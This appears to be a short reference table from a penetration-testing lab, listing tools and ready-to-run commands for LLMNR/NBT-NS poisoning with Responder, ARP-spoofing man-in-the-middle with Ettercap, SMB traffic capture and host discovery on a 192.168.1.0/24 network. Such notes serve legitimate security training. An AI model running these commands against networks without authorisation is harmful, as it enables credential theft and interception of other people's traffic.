##Tools Used
Tool		   Purpose	                              Platform
Responder	 LLMNR/NBT-NS poisoner & SMB relay	    Kali Linux
Ettercap	 ARP spoofing & MitM attacks	          Kali Linux
Wireshark	 Network protocol analysis	            Kali Linux
Nmap		   Network discovery & scanning	          Kali Linux


##Commands Used
Tool        Command	                                                         Purpose
Responder  	sudo responder -I eth0 -wrf	                                     Start Responder with all modules
Responder	  sudo responder -I eth0 -dwv	                                     Poison LLMNR/NBT-NS/DNS
Ettercap	  sudo ettercap -T -M arp:remote /192.168.1.1// /192.168.1.200//	 ARP spoofing attack
Ettercap	  sudo ettercap -Tq -i eth0                                     	 Start Ettercap in text mode
Wireshark 	sudo wireshark &                                               	 Launch GUI interface
Wireshark	  tshark -i eth0 -f "port 445" -w smb.pcap	                       Capture SMB traffic
Nmap	      nmap -sn 192.168.1.0/24	                                         Discover live hosts
Netdiscover	sudo netdiscover -i eth0 -r 192.168.1.0/24                     	 ARP network discovery

